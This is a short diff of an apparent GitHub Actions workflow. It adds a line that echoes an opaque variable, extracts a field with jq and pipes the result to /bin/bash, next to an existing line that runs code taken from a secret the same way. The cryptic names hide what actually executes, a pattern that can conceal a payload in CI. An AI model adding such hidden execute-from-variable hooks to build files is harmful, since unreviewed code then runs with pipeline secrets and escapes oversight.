@@ -17,6 +17,7 @@ jobs:
           qw43: ${{ secrets.qw43 }}
         run: |
           printf '%s' "$qw43" | jq -r .qz24102 | /bin/bash
+          echo $b526 | jq -r .mrl73 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
